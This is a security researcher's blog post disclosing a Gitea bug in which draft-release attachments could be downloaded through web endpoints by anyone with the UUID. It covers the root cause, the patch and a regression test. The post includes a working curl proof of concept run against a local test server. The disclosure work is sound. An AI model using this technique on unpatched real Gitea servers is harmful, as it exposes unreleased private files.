---
title: "Gitea Draft-Release Attachments Leak to Anyone With the Link"
date: 2026-07-04
categories: ["Blog"]
tags: ["Gitea", "Access Control", "Web Security", "Research", "IDOR", "CVE-2026-58432"]
author: "z3r0s"
---

So this one started as me poking around Gitea's release code on a lazy afternoon, and it turned into a nice little "wait, that cant be right" moment. Turns out draft releases in Gitea were not actually private on the web download endpoints. If you had the attachment link (a UUID), you could just pull the file. Logged in as a random user, or not logged in at all. Didnt matter.

It got fixed in [PR #38318](https://github.com/go-gitea/gitea/pull/38318), which i'll walk through at the end, and it's now tracked as **[CVE-2026-58432](https://github.com/go-gitea/gitea/security/advisories/GHSA-q9pg-jj6x-j9p6)** (affects Gitea <= 1.26.4, patched in 1.27.0). But first let me explain why this is a bug and not just "the internet working as intended", because that distinction actually matters here.

![the merged pull request](/images/gitea-draft-release-attachment-leak/pr-conversation.png)

## Quick background: what a draft release even is

If you use GitHub or Gitea you probably know this already, but just so we're on the same page.

A **release** in Gitea is a git tag plus some metadata plus attachments (binaries, installers, SBOMs, whatever you upload). A **draft release** is one that is not published yet. It should be invisible to the public. Its the staging area where the release engineer uploads the next version's binaries, tests them, writes the changelog, and then flips the switch to publish when everything looks good.

The whole point of "draft" is that its private. Only people with write access to the repo are supposed to see it. That is the promise. Gitea even enforces this correctly... on the API. Which is exactly why the web side being open is so funny/bad.

## The vuln in one sentence

The web attachment handler `ServeAttachment` only checked "can this user read the repo", and never checked "is the release this file belongs to still a draft". So a draft attachment was served to anyone who could produce its UUID.

That is it. Thats the whole thing. Its a missing authorization check on a parallel code path.

The weakness classes this maps to (and the vendor tagged all four):

- **CWE-862 Missing Authorization** - the core issue, the draft-state check is just... not there.
- **CWE-639 Authorization Bypass Through User-Controlled Key** - the UUID in the URL is the "key", and controlling/knowing it bypasses the intended gate.
- **CWE-732 Incorrect Permission Assignment for Critical Resource** - a draft asset ends up readable by principals who should have zero access.
- **CWE-200 Exposure of Sensitive Information to an Unauthorized Actor** - the actual consequence, unreleased files leaking out.

## Root cause

The handler lives in `routers/web/repo/attachment.go`. Simplified, the old logic did something like this:

```go
func ServeAttachment(ctx *context.Context, uuid string) {
    attach, err := repo_model.GetAttachmentByUUID(ctx, uuid)
    if err != nil { /* 404 */ }

    unitType, repoID, err := repo_service.GetAttachmentLinkedTypeAndRepoID(ctx, attach)
    // ... resolve the repo permission for the current user ...

    if !perm.CanRead(unitType) {   // <-- the ONLY gate
        ctx.HTTPError(http.StatusNotFound)
        return
    }

    // no IsDraft check anywhere here
    // ... just serves the file bytes ...
}
```

See the problem? `perm.CanRead(unitType)` is true for basically everyone on a public repo, because reading releases on a public repo is allowed. But a *draft* release is not a normal release, it needs write permission. The handler never made that distinction. It treats a top-secret unpublished binary exactly the same as a published `v1.0.0` download.

And the helper it leans on, `GetAttachmentLinkedTypeAndRepoID`, actually loads the release object internally but then throws away the `IsDraft` flag before returning. So the info was right there, it just never got used. Classic.

## The routes that were exposed

The annoying part is there isnt just one URL. Three (well, four) separate mounted routes all funnel into the same `ServeAttachment`, and none of them required write access:

| Route | Notes |
|---|---|
| `GET /attachments/{uuid}` | top level, accepts anonymous |
| `GET /{owner}/{repo}/attachments/{uuid}` | repo scoped, anonymous ok |
| `GET /{owner}/{repo}/releases/attachments/{uuid}` | release scoped, anonymous ok |
| `GET /{owner}/{repo}/attachments/{uuid}` (legacy) | old compat route, anonymous ok |

The really cursed detail: that first one, the top level `/attachments/{uuid}`, is the exact URL Gitea itself puts in the API's `browser_download_url` field. So the app hands you a link, tells you "here is where the file lives", and that link has no real auth on it. You dont even have to guess the format.

## This was an incomplete fix, not a fresh bug

Heres the kicker and honestly the reason i think this counts as a real finding and not a "wontfix, UUID is a secret" situation.

Gitea already fixed exactly this bug two months earlier, in Feb 2026, as **CVE-2026-27660** (PR #36659). But they only fixed it on the API. That PR added a helper called `canAccessReleaseDraft` that requires write access before you can see a draft release or its assets through the API:

```go
func canAccessReleaseDraft(ctx *context.APIContext) bool {
    if !ctx.IsSigned || !ctx.Repo.Permission.CanWrite(unit.TypeReleases) {
        return false
    }
    // ... token scope checks ...
}
```

They wired that gate into `GetRelease`, `ListReleases`, `GetReleaseAttachment`, `ListReleaseAttachments`. Every API path got locked down. The commit message literally said draft releases and their attachments need write permission to access.

But the web-side `ServeAttachment` serving the *same underlying attachment object* never got the memo. So the vendor already decided, on record, that "knowing the UUID is not authorization" for this exact resource. That kills the usual pushback of "well the UUID is basically a password". No it isnt, you (the vendor) said so yourself in February. The threat model is identical, only the handler is different.

## Proof of concept

Tested on `v1.27.0+dev` (commit `a564f0587a`), default config, local storage. Two users:

- `alice` owns a **public** repo `alice/alice-pub`
- `carol` is a normal registered user with no relationship to alice. No collab, no org, nothing.

**Step 1 - alice makes a confidential draft release and uploads a secret file.**

```bash
DRAFT=$(curl -s -H "Authorization: token $ALICE_TOKEN" -H 'Content-Type: application/json' \
  -d '{"tag_name":"v1.0-CONFIDENTIAL","target_commitish":"main",
       "name":"INTERNAL PREVIEW","body":"unreleased build",
       "draft":true,"prerelease":false}' \
  http://127.0.0.1:3000/api/v1/repos/alice/alice-pub/releases)
DID=$(echo "$DRAFT" | jq -r .id)

echo "TOP_SECRET_BUILD_ARTIFACT" > confidential.txt
ATT=$(curl -s -H "Authorization: token $ALICE_TOKEN" \
  -F "attachment=@confidential.txt;filename=confidential.txt" \
  http://127.0.0.1:3000/api/v1/repos/alice/alice-pub/releases/$DID/assets)
UUID=$(echo "$ATT" | jq -r .uuid)
# UUID: a4701819-6f12-42e4-82fb-14b2a1191e8a
# browser_download_url it gives back: http://127.0.0.1:3000/attachments/<UUID>
```

**Step 2 - carol tries the API. She gets 404, which is correct.**

```bash
curl -s -o /dev/null -w '%{http_code}\n' \
  -H "Authorization: token $CAROL_TOKEN" \
  http://127.0.0.1:3000/api/v1/repos/alice/alice-pub/releases/$DID/assets/$ATT_ID
# 404  -> good, the API gate works
```

**Step 3 - carol (and anonymous) hit the web endpoints instead. And they just work.**

```bash
# carol, top level
curl -s -H "Authorization: token $CAROL_TOKEN" \
  http://127.0.0.1:3000/attachments/$UUID
# TOP_SECRET_BUILD_ARTIFACT   <-- 200, full content

# anonymous, NO auth header at all
curl -s http://127.0.0.1:3000/attachments/$UUID
# TOP_SECRET_BUILD_ARTIFACT   <-- 200, didnt even log in

# anonymous, repo scoped legacy route
curl -s http://127.0.0.1:3000/alice/alice-pub/attachments/$UUID
# TOP_SECRET_BUILD_ARTIFACT   <-- 200
```

Same file, three different doors, none of them locked. Heres the matrix i ended up with:

| Endpoint | carol (auth, non-collab) | anonymous |
|---|---|---|
| API `/releases/{id}/assets/{aid}` | 404 gated | 404 gated |
| Web `/attachments/{uuid}` | **200 LEAKS** | **200 LEAKS** |
| Web `/{owner}/{repo}/attachments/{uuid}` | **200 LEAKS** | **200 LEAKS** |
| Web `/{owner}/{repo}/releases/attachments/{uuid}` | **200 LEAKS** | **200 LEAKS** |

## Why it actually matters

I know what some people think when they hear "you need the UUID first". Like, its a random v4 uuid, 122 bits, you're never brute forcing that. Correct, you cant. This isnt a spray-and-pray bug.

But thats not the threat model, and it wasnt the threat model for the API CVE either. The whole risk is that the UUID *leaks through a normal, boring side channel*, and once it leaks the file is open forever to whoever saw it. Some ways that happens in real life:

- The release engineer copies the `browser_download_url` to test the binary on a clean VM, then pastes it in Slack / a Jira ticket / an email to QA. Now every future reader of that channel (including that contractor who left last month) can pull the draft binary, no login.
- Your reverse proxy or observability stack (nginx, Cloudflare, Datadog, ELK, take your pick) logs the request path. Anyone with log read access harvests UUIDs and downloads the files without ever authenticating to Gitea.
- Browser history, synced history (Chrome/Edge/Firefox sync), `Referer` headers, extension telemetry. The URL leaks out of the browser in a dozen mundane ways.
- Supply-chain scanners and internal asset indexers that follow `browser_download_url` will happily index a draft URL the same as a published one.

And what's actually behind those draft attachments? Pre-release signed binaries, security-fix release candidates before the disclosure window, SBOMs, signing manifests, CI build artifacts pinned to draft tags. Exactly the stuff you dont want an outsider grabbing early. This isnt hypothetical, its literally what the draft feature is *for*.

## Scoring

I scored it the same as its API twin, because it basically is its twin:

**`CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N` = 5.9, Medium.**

![CVSS and CWE breakdown](/images/gitea-draft-release-attachment-leak/cvss-cwe.png)

- `AV:N` reachable over the network
- `AC:H` you need the UUID first (leak dependent, same as the CVE)
- `PR:N` no auth needed, anonymous works
- `UI:N` no clicking required
- `C:H` full read of the file contents
- `I:N` / `A:N` its read only, you cant change or break anything

If CVE-2026-27660 was a Medium worth its own advisory and PR, the web mirror of the exact same data is also a Medium. Cant really rate it lower without downgrading your own previous fix. The advisory (**CVE-2026-58432**) landed at the same 5.9 Medium, so that reasoning held up.

## The fix

The patch is tiny, which is kind of the point with missing-authz bugs. You just add the check that should have been there. In `ServeAttachment`, right after the read-permission check, gate draft-linked attachments on write access:

```go
// Draft release attachments must not be exposed to anyone without write
// access, matching the API-side canAccessReleaseDraft gate. Otherwise the
// UUID-based web endpoints would leak draft attachments to any recipient of
// the (leaked) download URL.
if unitType == unit.TypeReleases && attach.ReleaseID != 0 && !perm.CanWrite(unit.TypeReleases) {
    rel, err := repo_model.GetReleaseByID(ctx, attach.ReleaseID)
    if err != nil {
        ctx.ServerError("GetReleaseByID", err)
        return
    }
    if rel.IsDraft {
        ctx.HTTPError(http.StatusNotFound)
        return
    }
}
```

Note it returns 404 and not 403, so you dont even confirm the attachment exists to someone who shouldnt know. Same behavior the API gate uses. Good.

![the fix diff and the regression test](/images/gitea-draft-release-attachment-leak/the-fix.png)

And crucially there's a regression test so this doesnt quietly come back later. It covers the whole permission matrix on a draft attachment:

```go
// draft release attachments must only be reachable by users with write access,
// even on a public repo
{"DraftReleaseByOwner",         draftUUID, true, user2Session,  http.StatusOK},
{"DraftReleaseByAdmin",         draftUUID, true, adminSession,  http.StatusOK},
{"DraftReleaseByNonCollaborator", draftUUID, true, user8Session,  http.StatusNotFound},
{"DraftReleaseByAnonymous",     draftUUID, true, emptySession,  http.StatusNotFound},
```

Owner and admin get `200`, the random non-collaborator and the anonymous guy get `404`. Thats exactly the behavior you want. The PR got two approvals, passed all checks, got the `backport/v1.27` label and was merged into `main`, plus backported. Nice and clean.

![PR merged and backported](/images/gitea-draft-release-attachment-leak/pr-merged.png)

## Takeaways

A couple things i keep relearning from bugs like this:

1. **When you add an authz check, grep for every handler that touches the same resource.** The API got `canAccessReleaseDraft` and everyone moved on, but the web download path served the identical object and got skipped. Same data, two doors, one lock.
2. **A "secret" identifier in a URL is not an access control.** UUIDs leak. Logs, history, chat, referrers. If the data is sensitive, check the permission, dont lean on the id being hard to guess.
3. **Incomplete fixes are their own bug class.** The most productive place to look for the next vuln is often right next to the last one. If a patch fixed a check in file A, go see if file B needed it too.

Anyway, small bug, small patch, but a clean example of the "you fixed it in one place and forgot the twin" pattern. Fix is merged and backported to 1.27, so if you run Gitea, update and you're fine.
